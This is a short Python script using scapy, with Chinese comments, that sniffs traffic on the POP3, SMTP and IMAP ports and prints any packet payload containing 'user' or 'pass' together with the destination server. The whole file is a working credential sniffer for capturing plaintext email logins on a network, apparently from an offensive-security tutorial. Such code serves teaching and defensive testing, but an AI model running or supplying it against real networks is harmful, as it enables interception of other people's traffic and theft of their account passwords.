#-*- coding:utf8 -*-

from scapy.all import *

# 定义数据包回调函数
def packet_callback(packet):

    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():

            print "[*] Server: %s" % packet[IP].dst
            print "[*] %s" % packet[TCP].payload
    # print packet.show()

# 开启嗅探器(对常见电子邮件端口进行嗅探１１０（ＰＯＰ３），　２５（ＳＭＴＰ），　１４３（ＩＭＡＰ), store=0:不保留原始数据包，长时间嗅探的话不会暂用太多内存
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0)